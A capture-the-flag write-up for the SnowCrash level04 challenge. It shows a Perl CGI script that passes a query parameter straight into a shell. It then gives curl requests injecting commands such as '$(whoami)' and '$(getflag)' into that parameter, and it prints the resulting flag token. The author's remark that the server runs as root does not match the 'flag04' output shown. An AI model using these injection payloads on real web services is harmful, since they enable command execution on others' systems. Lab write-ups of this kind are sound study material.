# SnowCrash - Level04

## Objective

Find the password for the next level by logging into the `flag04` account.

## Steps

### 1. Locate files needed for the challenge
```bash
ls 
```

A perl script named level04 is present

```bash
level04@SnowCrash:~$ cat level04.pl 
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

We can see that it's running the query param "x" raw on the machine, not filtering it's content, making it easy to probe information about the script (This one is probably a copy of the real one running somewhere on the machine). Let's find out if it's true !

```bash
level04@SnowCrash:~$ curl -X GET '127.0.0.1/?x=test;id'
<html><body><h1>It works!</h1>
<p>This is the default web page for this server.</p>
<p>The web server software is running but no content has been added, yet.</p>
</body></html>
```

We can see that the default port 80 hits the webserver, but the script gives us a hint, port 4747 which is where this script gets executed through perl

```bash
level04@SnowCrash:~$ curl -X GET '127.0.0.1:4747/?x=test;whoami'
test
```

yup, though that didnt work. Let's try shell command substitution 

```bash
level04@SnowCrash:~$ curl -X GET '127.0.0.1:4747/?x=$(whoami)'
flag04
```

We can see that our command gets interpreted before being ran and that the server is ran as root so we can easily craft a command to get us the flag

```bash
level04@SnowCrash:~$ curl -X GET '127.0.0.1:4747/?x=$(getflag)'
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```
